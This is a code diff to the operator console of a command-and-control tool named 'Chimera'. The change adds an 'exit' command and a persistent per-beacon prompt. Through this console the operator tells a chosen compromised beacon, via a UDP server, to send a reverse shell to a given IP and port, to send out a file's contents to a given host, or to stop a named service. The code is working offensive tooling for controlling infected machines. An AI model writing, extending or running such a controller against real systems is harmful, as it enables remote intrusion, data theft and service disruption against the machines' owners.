@@ -38,75 +38,79 @@ def runInteractive(SERVER):
                 if selection not in beacons:
                     print("Invalid selection. Please select a valid beacon IP.")
             print(f"Selected Beacon: {selection}")
-            entered = input("Enter command: ")
-            if (entered == "shell"):
-                ip = ""
-                while not (len(ip.split('.')) == 4):
-                    ip = input("Enter IP to send shell to: ")
-                    if not (len(ip.split('.')) == 4):
-                        print("Invalid IPv4 address entered.")
-                port = 0
-                while not ((int(port) > 0) and (int(port) <= 510)):
-                    port = input("Enter port to send shell to (1-510): ")
-                    if not ((int(port) > 0) and (int(port) <= 510)):
-                        print("Invalid port entered. Valid port range is 1-510.")
-                packet = "shell:" + ip + ":" + port + ":" + selection
-                try:
-                    sock.sendto(packet.encode(),(SERVER, 10000))
-                except socket.timeout:
-                    print("Socket timeout. Server may be down or otherwise unresponsive.")
-                try:
-                    resp, _ = sock.recvfrom(512)
-                except socket.timeout:
-                    print("Socket timeout. Server may be down or otherwise unresponsive.")
-                if not (resp.decode() == "confirm"):
-                    print("Server error. Action not performed.")
-            elif (entered == "file"):
-                filePath = ""
-                while not (len(filePath) > 0):
-                    filePath = input("Enter file path: ")
-                    if not (len(filePath) > 0):
-                        print("Invalid file path.")
-                ip = ""
-                while not (len(ip.split('.')) == 4):
-                    ip = input("Enter IP to send shell to: ")
-                    if not (len(ip.split('.')) == 4):
-                        print("Invalid IPv4 address entered.")
-                port = 0
-                while not ((int(port) > 0) and (int(port) <= 510)):
-                    port = input("Enter port to send shell to (1-510): ")
-                    if not ((int(port) > 0) and (int(port) <= 510)):
-                        print("Invalid port entered. Valid port range is 1-510.")
-                packet = "file:" + filePath + ":" + ip + ":" + port + ":" + selection
-                try:
-                    sock.sendto(packet.encode(),(SERVER, 10000))
-                except socket.timeout:
-                    print("Socket timeout. Server may be down or otherwise unresponsive.")
-                try:
-                    resp, _ = sock.recvfrom(512)
-                except socket.timeout:
-                    print("Socket timeout. Server may be down or otherwise unresponsive.")
-                if not (resp.decode() == "confirm"):
-                    print("Server error. Action not performed.")
-            elif (entered == "service"):
-                serviceName = ""
-                while not (len(serviceName) > 0):
-                    serviceName = input("Enter service name: ")
-                    if not (len(serviceName) > 0):
-                        print("Invalid service name.")
-                packet = "service:" + serviceName + ":" + selection
-                try:
-                    sock.sendto(packet.encode(),(SERVER, 10000))
-                except socket.timeout:
-                    print("Socket timeout. Server may be down or otherwise unresponsive.")
-                try:
-                    resp, _ = sock.recvfrom(512)
-                except socket.timeout:
-                    print("Socket timeout. Server may be down or otherwise unresponsive.")
-                if not (resp.decode() == "confirm"):
-                    print("Server error. Action not performed.")
-            else:
-                printBeaconHelp()
+            cont = True
+            while cont:
+                entered = input(selection + "[#] ")
+                if (entered == "exit"):
+                    cont = False
+                elif (entered == "shell"):
+                    ip = ""
+                    while not (len(ip.split('.')) == 4):
+                        ip = input("Enter IP to send shell to: ")
+                        if not (len(ip.split('.')) == 4):
+                            print("Invalid IPv4 address entered.")
+                    port = 0
+                    while not ((int(port) > 0) and (int(port) <= 510)):
+                        port = input("Enter port to send shell to (1-510): ")
+                        if not ((int(port) > 0) and (int(port) <= 510)):
+                            print("Invalid port entered. Valid port range is 1-510.")
+                    packet = "shell:" + ip + ":" + port + ":" + selection
+                    try:
+                        sock.sendto(packet.encode(),(SERVER, 10000))
+                    except socket.timeout:
+                        print("Socket timeout. Server may be down or otherwise unresponsive.")
+                    try:
+                        resp, _ = sock.recvfrom(512)
+                    except socket.timeout:
+                        print("Socket timeout. Server may be down or otherwise unresponsive.")
+                    if not (resp.decode() == "confirm"):
+                        print("Server error. Action not performed.")
+                elif (entered == "file"):
+                    filePath = ""
+                    while not (len(filePath) > 0):
+                        filePath = input("Enter file path: ")
+                        if not (len(filePath) > 0):
+                            print("Invalid file path.")
+                    ip = ""
+                    while not (len(ip.split('.')) == 4):
+                        ip = input("Enter IP to send shell to: ")
+                        if not (len(ip.split('.')) == 4):
+                            print("Invalid IPv4 address entered.")
+                    port = 0
+                    while not ((int(port) > 0) and (int(port) <= 510)):
+                        port = input("Enter port to send shell to (1-510): ")
+                        if not ((int(port) > 0) and (int(port) <= 510)):
+                            print("Invalid port entered. Valid port range is 1-510.")
+                    packet = "file:" + filePath + ":" + ip + ":" + port + ":" + selection
+                    try:
+                        sock.sendto(packet.encode(),(SERVER, 10000))
+                    except socket.timeout:
+                        print("Socket timeout. Server may be down or otherwise unresponsive.")
+                    try:
+                        resp, _ = sock.recvfrom(512)
+                    except socket.timeout:
+                        print("Socket timeout. Server may be down or otherwise unresponsive.")
+                    if not (resp.decode() == "confirm"):
+                        print("Server error. Action not performed.")
+                elif (entered == "service"):
+                    serviceName = ""
+                    while not (len(serviceName) > 0):
+                        serviceName = input("Enter service name: ")
+                        if not (len(serviceName) > 0):
+                            print("Invalid service name.")
+                    packet = "service:" + serviceName + ":" + selection
+                    try:
+                        sock.sendto(packet.encode(),(SERVER, 10000))
+                    except socket.timeout:
+                        print("Socket timeout. Server may be down or otherwise unresponsive.")
+                    try:
+                        resp, _ = sock.recvfrom(512)
+                    except socket.timeout:
+                        print("Socket timeout. Server may be down or otherwise unresponsive.")
+                    if not (resp.decode() == "confirm"):
+                        print("Server error. Action not performed.")
+                else:
+                    printBeaconHelp()
         else:
             printCommHelp()
 
@@ -190,6 +194,7 @@ def printBeaconHelp():
     Chimera beacon commands
 ---------------------------------
 
+exit - exits out of the selected beacon and returns to the main controller
 shell - prompts for IP/port to send a reverse shell to
 file - prompts for file name to collect data from and the ip/port to send the data to
 service - prompts for service name to stop on the beacon
